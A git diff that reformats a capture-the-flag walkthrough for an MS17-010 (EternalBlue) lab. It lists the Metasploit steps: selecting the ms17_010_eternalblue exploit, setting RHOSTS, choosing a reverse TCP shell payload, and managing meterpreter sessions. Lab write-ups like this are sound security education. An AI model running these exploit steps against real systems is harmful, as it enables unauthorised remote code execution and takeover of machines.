@@ -45,22 +45,23 @@ Answer: 3 in total
 ### Q3: What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)
 Answer: MS17-010 clearly visible from nmap when --script vuln used.
 	
-
+---
 ## Task 2: Gain Access
 	
 ### Q1: no answer required
 
 ### Q2: Find the exploit code we will run against the machine:
 	
-Start msfconsole then search for ms17_010, option 0 contains:
-Answer: exploit/windows/smb/ms17_010_eternalblue the question is vague but it's pretty obvious this is the first one that matches. The all start exploit/windows/smb/. The answer is rated average, one below is rated great and should have been a better bet:
+- Start msfconsole then search for ms17_010, option 0 contains:
+Answer: exploit/windows/smb/ms17_010_eternalblue 
+- The answer is rated average, one below is rated great and should have been a better bet:
 ```
 27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
 ```	
-Next to select exploit enter :
+- Next to select exploit enter :
 	use 0
 
-### Q3 :Use show options to learn what needs changing:
+### Q3 :Use **show options** to learn what needs changing:
 	Answer: RHOSTS
 	
 Then enter the RHOST IP with:
@@ -69,8 +70,7 @@ Then enter the RHOST IP with:
 ### Q4: Then change the payload to the given:  no response required
 	set payload windows/x64/shell/reverse_tcp
 	
-### Q5: Run no response required
-	Then run and a meterpreter prompt appears.
+### Q5: Then run and a meterpreter prompt appears.
 	
 	This states background using ctrl + Z, here is a summary of the important commands here:
 	Command	Does
@@ -80,7 +80,7 @@ Then enter the RHOST IP with:
 	ssessions -k <ID> 	Kill the session <ID>, if unstable will close on their own.
 	Sessions -K	        Kills all sessions running
 	
-	
+---	
 ## Task3: 
 ### Q1: Research online how to convert a shell to meterpreter shell in metasploit
 	
